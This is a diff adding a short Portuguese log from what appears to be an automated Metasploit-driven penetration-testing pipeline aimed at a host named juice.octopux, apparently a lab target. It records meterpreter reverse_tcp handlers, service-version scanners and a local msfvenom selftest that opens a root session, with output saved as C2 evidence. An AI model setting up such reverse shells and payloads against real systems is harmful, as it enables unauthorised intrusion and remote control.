@@ -1,0 +1,13 @@
+[msf-rpc] === Fase Exploração ETAPA 2 — alvo: juice.octopux (portas: 22,80,443) ===
+[msf-rpc] Iniciando msfrpcd (daemon RPC, boot ~40-60s)...
+[msf-rpc] msfrpcd ativo.
+[msf-rpc] Handler: linux/x64/meterpreter/reverse_tcp:4444 (192.168.50.210)
+[msf-rpc] Handler: windows/meterpreter/reverse_tcp:4445 (192.168.50.210)
+[msf-rpc] scanner: auxiliary/scanner/ssh/ssh_version → juice.octopux
+[msf-rpc] scanner: auxiliary/scanner/http/http_version → juice.octopux
+[msf-rpc] SELFTEST: msfvenom meterpreter → disparo local → session via RPC...
+MSF_SESSION_OPENED: sid=1 tipo=meterpreter peer=192.168.50.210:59754 via=exploit/multi/handler (00:42:23)
+MSF_SYSINFO: sid=1 | Computer     : Lazarus | OS           : Debian  (Linux 6.1.0-35-amd64) | Architecture : x64 | BuildTuple   : x86_64-linux-musl
+MSF_GETUID: sid=1 | Server username: root
+MSF_ROOT_CONFIRMED: sid=1 | Server username: root — ROOT REAL OBTIDO
+[msf-rpc] Evidência estruturada: /ruadan/output/juice_octopux/msf_c2_evidence.json
